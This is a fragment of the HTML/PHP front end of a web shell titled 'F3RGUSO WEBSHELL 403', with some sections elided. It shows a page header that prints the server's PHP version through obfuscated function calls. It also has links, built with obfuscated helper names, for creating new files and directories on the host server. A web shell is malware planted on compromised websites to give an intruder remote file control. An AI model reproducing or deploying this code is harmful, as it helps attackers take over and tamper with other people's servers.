...
<head>
	...
	<title>F3RGUSO WEBSHELL 403</title>
...
<body style="background-color:#ff052f;color:#fc037b;font-family:serif;">
	<div class="bg-info table-responsive text-light border">
		<div class="d-flex justify-content-between p-1">
			<div><h3 class="mt-2"><a href="?"><?= Yp; ?></a></h3></div>
			<div>
				<span><font color="#ff0818">PHP Version : <?= $c8[1](); ?></font></span> <br>
				<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>"><font color="#00ff00">Add New File</font></a>
				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>"><font color="#00ff00">Add New Directory</font></a>
			</div>
		</div>
	...
	<div class="bg-info border table-responsive mt-2">
	...
	<article class="bg-info border table-responsive mt-2">
	...
	<div class="bg-info border text-center mt-2">
		<small>Copyright &copy; 2022 - F3RGUSO WEBSHEL </small>
	</div>
